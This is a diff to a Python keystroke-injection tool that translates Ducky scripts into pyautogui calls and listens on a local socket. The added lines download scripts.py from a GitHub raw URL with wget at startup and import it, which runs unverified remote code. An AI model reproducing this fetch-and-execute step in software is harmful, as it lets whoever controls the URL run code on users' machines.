@@ -1,11 +1,15 @@
 import socket
-from time import sleep as s
 import time
 import os
-import pip
-import sys
-import pyautogui as p
 import pyautogui
+p = pyautogui
+a = p.alert
+w = p.write
+h = p.hotkey
+s = time.sleep
+
+os.system("wget https://raw.githubusercontent.com/Linoschopp/pico/main/scripts.py")
+import scripts
 
 def ducky(duckyScript):
 
@@ -71,10 +75,6 @@ def ducky(duckyScript):
             pythonScript += f"time.sleep({defaultDelay})\n"
     return pythonScript
 
-
-a = p.alert
-w = p.write
-h = p.hotkey
 
 IP = socket.gethostbyname(socket.gethostname()+".local")
 PORT = 8000
